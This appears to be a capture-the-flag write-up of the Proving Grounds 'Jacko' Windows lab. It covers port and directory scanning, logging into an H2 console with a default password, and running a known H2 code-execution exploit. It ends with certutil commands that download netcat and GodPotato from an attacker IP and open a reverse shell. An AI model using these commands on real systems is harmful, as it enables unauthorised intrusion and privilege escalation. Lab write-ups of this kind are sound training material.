---
title: Jacko
date: 2026-02-03T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - http
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Jacko"
---


nmap -p- $IP  --min-rate 5000 -o nmap-deep.txt  

![](Screenshot%202026-02-04%20at%2008.02.22.png)

`gobuster dir -u http://$IP/  -w /usr/share/wordlists/dirb/common.txt`

![](Screenshot%202026-02-04%20at%2008.07.18.png)

![](Screenshot%202026-02-04%20at%2008.13.26.png)

Lets have a look at the site on port 80.

![](Screenshot%202026-02-04%20at%2008.14.09.png)

Port 8082:

Default password will get you in.

![](Screenshot%202026-02-04%20at%2016.49.00.png)

![](Screenshot%202026-02-04%20at%2008.14.59.png)

I'm hoping that we cant use this console to 

![](Screenshot%202026-02-04%20at%2008.27.44.png)

![](Screenshot%202026-02-04%20at%2008.31.08.png)

Think we'll try this one out. Version 1.4.199

![](Screenshot%202026-02-04%20at%2008.33.07.png)

Copy the code up to and including --Load native library.. from 49384.txt into the SQL console.

![](Screenshot%202026-02-04%20at%2008.49.55.png)

![](Screenshot%202026-02-04%20at%2016.50.30.png)
Copy the --Evaluate script, section.

![](Screenshot%202026-02-04%20at%2008.48.17.png)


![](Screenshot%202026-02-04%20at%2009.00.02.png)

![](Screenshot%202026-02-04%20at%2009.01.43.png)

Replace the "whoami" with the commands below one at a time.

`certutil -f -urlcache http://192.168.45.219/nc64.exe C:\\Users\\Public\\nc.exe

`certutil -f -urlcache http://192.168.45.219/GodPotato-NET4.exe C:\\Users\\Public\\gp.exe.exe`

`"C:\\Users\\Public\\gp.exe -cmd \"C:\\Users\\Public\\nc.exe 192.168.45.222 1234 -e cmd.exe\""`

![](Screenshot%202026-02-04%20at%2016.45.25.png)

7 hours